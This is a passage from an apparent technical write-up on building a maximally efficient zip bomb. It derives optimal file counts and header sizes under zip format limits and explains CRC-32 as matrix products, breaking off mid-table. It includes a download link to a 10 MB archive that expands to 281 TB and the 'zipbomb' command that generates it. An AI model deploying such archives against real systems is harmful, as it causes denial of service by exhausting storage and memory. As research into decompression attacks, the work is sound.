is the size of <var>N</var> copies
of the kernel,
decompressed at ratio&nbsp;C.
(In this simplified model we ignore
the minor additional expansion from quoted local file headers.)
</p>

<figure>
<table>
<tbody><tr>
<td><var>S</var><sub><var>X</var></sub>(<var>N</var>)</td><td>&nbsp;= (<var>X</var> − <var>H</var>(<var>N</var>)) C <var>N</var></td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>X</var> − (<var>N</var> ⋅ (CDH + LFH) + (<var>N</var> − 1) ⋅ Q)) C <var>N</var></td>
</tr>
<tr>
<td></td><td>&nbsp;= −(CDH + LFH + Q) C <var>N</var><sup>2</sup> + (<var>X</var> + Q) C <var>N</var></td>
</tr>
</tbody></table>
</figure>

<p>
<var>S</var><sub><var>X</var></sub>(<var>N</var>) is a polynomial in <var>N</var>,
so its maximum must be at a place where the derivative
<var>S</var>′<sub><var>X</var></sub>(<var>N</var>)
is zero.
Taking the derivative and finding the zero gives us
<var>N</var><sub>OPT</sub>,
the optimal number of files.
</p>

<figure>
<table>
<tbody><tr>
<td><var>S</var>′<sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= −2 (CDH + LFH + Q) C <var>N</var><sub>OPT</sub> + (<var>X</var> + Q) C</td>
</tr>
<tr>
<td>0</td><td>&nbsp;= −2 (CDH + LFH + Q) C <var>N</var><sub>OPT</sub> + (<var>X</var> + Q) C</td>
</tr>
<tr>
<td><var>N</var><sub>OPT</sub></td><td>&nbsp;= (<var>X</var> + Q) / (CDH + LFH + Q) / 2</td>
</tr>
</tbody></table>
</figure>

<p>
<var>H</var>(<var>N</var><sub>OPT</sub>)
gives the optimal amount of space to allocate for file headers.
It is independent of CDH, LFH, and C,
and is close to <var>X</var> / 2.
</p>

<figure>
<table>
<tbody><tr>
<td><var>H</var>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= <var>N</var><sub>OPT</sub> ⋅ (CDH + LFH) + (<var>N</var><sub>OPT</sub> − 1) ⋅ Q</td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>X</var> − Q) / 2</td>
</tr>
</tbody></table>
</figure>

<p>
<var>S</var><sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)
is the total unzipped size
when the allocation is optimal.
From this we see that the output size grows quadratically
in the input size.
</p>

<figure id="eq-S_X_N_OPT">
<table>
<tbody><tr>
<td>
<var>S</var><sub><var>X</var></sub>(<var>N</var><sub>OPT</sub>)</td><td>&nbsp;= (<var>X</var> + Q)<sup>2</sup> C / (CDH + LFH + Q) / 4</td>
</tr>
</tbody></table>
</figure>



<p>
As we make the zip file larger,
eventually we run into the limits of the zip format.
A&nbsp;zip file can contain at most 2<sup>16</sup>&nbsp;−&nbsp;1 files,
and each file can have an uncompressed size of at most 2<sup>32</sup>&nbsp;−&nbsp;1 bytes.
Worse than that,
<a href="#compatibility">some implementations</a>
take the maximum possible values
as an indicator of the presence of <a href="#zip64">64-bit extensions</a>,
so our limits are actually 2<sup>16</sup>&nbsp;−&nbsp;2 and 2<sup>32</sup>&nbsp;−&nbsp;2.
<!--
https://github.com/golang/go/commit/4aedbf5be4631693f774063410707ef467ca78e7
https://github.com/golang/go/commit/b6c5edae7c0e9dd6d12dbb8f1c9638dea45f9464
-->
It happens that the first limit we hit is the one on uncompressed file size.
At a zip file size of 8 319 377&nbsp;bytes,
naive optimization would give us a file count of 47 837
and a largest file of
2<sup>32</sup>&nbsp;+&nbsp;311 bytes.
</p>

<!--
$compressed_size
[1] 4160277

$num_files
[1] 47837

[1] "zipped size" "8319377"
[1] "unzipped size"   "205420672417247"
[1] 4294967607
-->

<p>
Accepting that we cannot increase <var>N</var> nor the size of the kernel without bound,
we would like find the maximum compression ratio achievable
while remaining within the limits of the zip format.
The way to proceed is to make the kernel as large as possible,
and have the maximum number of files.
Even though we can no longer maintain the roughly even split
between kernel and file headers,
each added file <em>does</em> increase the compression ratio—just
not as fast as it would if we were able to keep growing the kernel, too.
In fact, as we add files we will need to <em>decrease</em> the size of the kernel
to make room for the maximum file size
that gets slightly larger with each added file.
</p>

<p>
The plan results in a zip file
that contains 2<sup>16</sup>&nbsp;−&nbsp;2 files and a kernel that decompresses
to 2<sup>32</sup>&nbsp;−&nbsp;2 178 825 bytes.
Files get longer towards the beginning of the zip file—the
first and largest file decompresses to
2<sup>32</sup>&nbsp;−&nbsp;56 bytes.
That is as close as we can get using the coarse
output sizes of bulk_deflate—encoding
the final 54&nbsp;bytes would cost more bytes than they are worth.
(The zip file as a whole has a compression ratio
of 28&nbsp;million, and the final 54&nbsp;bytes would gain
at most 54&nbsp;⋅&nbsp;1032&nbsp;⋅&nbsp;(2<sup>16</sup>&nbsp;−&nbsp;2) ≈ <data value="3652078752">36.5&nbsp;million bytes</data>,
so it only helps if the 54&nbsp;bytes can be encoded
in 1&nbsp;byte—I&nbsp;could not do it in less than&nbsp;2.)
The output size of this zip bomb, 281 395 456 244 934&nbsp;bytes,
is 99.97% of the theoretical maximum
(2<sup>32</sup>&nbsp;−&nbsp;1) ⋅ (2<sup>16</sup>&nbsp;−&nbsp;1).
<!-- 65 535 × 0xffffffff = <data value="281470681677825">281 470 681 677 825</data>. -->
Any major improvements to the compression ratio can only come
from reducing the input size,
not increasing the output size.
<!--
>>> (2**32-1)*65535 - 281399752637796
70929040029
>>> 70929040029. / ((2**32-1)*65535)
0.00025199441592352524
>>> 1 - _
0.9997480055840765
>>> _ * 100
99.97480055840765
-->
</p>

<div id="download-zblg">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zblg.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zblg.zip</a>
<span><data value="9893525">10&nbsp;<abbr title="megabyte">MB</abbr></data>&nbsp;→&nbsp;<data value="281395456244934">281&nbsp;<abbr title="terabyte">TB</abbr></data></span></p><pre>zipbomb --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525 &gt; zblg.zip</pre>
</div>

</section>

</section>

<section id="crc32">
<h2>Efficient CRC-32 computation</h2>

<p>
Among the metadata in the central directory header and local file header
is a
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">CRC-32</a>
checksum of the uncompressed file data.
This poses a problem, because directly calculating the CRC-32 of each file
requires doing work proportional to the total <em>unzipped</em> size,
which is large by design. (It's a zip bomb, after all.)
We would prefer to do work that in the worst case is
proportional to the <em>zipped</em> size.
Two factors work in our advantage:
all files share a common suffix (the kernel),
and the uncompressed kernel is a string of repeated bytes.
We will represent CRC-32 as a matrix product—this
will allow us not only to compute the checksum of the kernel quickly,
but also to reuse computation across files.
The technique described in this section is a slight extension of the
<a href="https://github.com/madler/zlib/blob/v1.2.11/crc32.c#L372"><code>crc32_combine</code></a>
function in zlib,
which Mark Adler explains
<a href="https://stackoverflow.com/questions/23122312/crc-calculation-of-a-mostly-static-data-stream/23126768#23126768">here</a>.
</p>

<p>
You can model CRC-32 as a state machine that updates a 32-bit state register
for each incoming bit.
The basic update operations for a 0&nbsp;bit and a 1&nbsp;bit are:
</p>

<figure>
<pre><code>uint32 crc32_update_0(uint32 state) {
    // Shift out the least significant bit.
    bit b = state &amp; 1;
    state = state &gt;&gt; 1;
    // If the shifted-out bit was 1, XOR with the CRC-32 constant.
    if (b == 1)
        state = state ^ 0xedb88320;
    return state;
}

uint32 crc32_update_1(uint32 state) {
    // Do as for a 0 bit, then XOR with the CRC-32 constant.
    return crc32_update_0(state) ^ 0xedb88320;
}</code></pre>
</figure>

<p>
If you think of the state register as a 32-element binary vector,
and use XOR for addition and AND for multiplication, then
<code>crc32_update_0</code> is a
<a href="https://en.wikipedia.org/wiki/Linear_map">linear transformation</a>;
i.e., it can be represented as multiplication by a
32×32 binary
<a href="https://en.wikipedia.org/wiki/Transformation_matrix">transformation matrix</a>.
To see why, observe that multiplying a matrix by a vector
is just summing the columns of the matrix,
after multiplying each column by the corresponding element of the vector.
The shift operation <code>state&nbsp;&gt;&gt;&nbsp;1</code>
is just taking each bit&nbsp;<var>i</var> of the state vector
and multiplying it by a vector that is 0 everywhere except at bit <var>i</var>&nbsp;−&nbsp;1
(numbering the bits from right to left).
The conditional final XOR <code>state&nbsp;^&nbsp;0xedb88320</code>
that only happens when bit&nbsp;<code>b</code> is 1
can instead be represented as first multiplying
<code>b</code> by 0xedb88320
and then XORing it into the state.
</p>

<p>
Furthermore, <code>crc32_update_1</code> is just
<code>crc32_update_0</code> plus (XOR) a&nbsp;constant.
That makes <code>crc32_update_1</code> an
<a href="https://en.wikipedia.org/wiki/Affine_transformation">affine transformation</a>:
a&nbsp;matrix multiplication followed by a translation (i.e., vector addition).
We can represent both the matrix multiplication and the translation
in a single step
if we enlarge the dimensions of the transformation matrix to 33×33
and append an extra element to the state vector that is always&nbsp;1.
(This representation is called
<a href="https://en.wikipedia.org/wiki/Transformation_matrix#Affine_transformations">homogeneous coordinates</a>.)
</p>

<figure>

<table>
<caption><var>M</var><sub>0</sub></caption>
<tbody>
<tr><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
</tbody>
</table><!--

--><table>
<caption><var>M</var><sub>1</sub></caption>
<tbody>
<tr><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
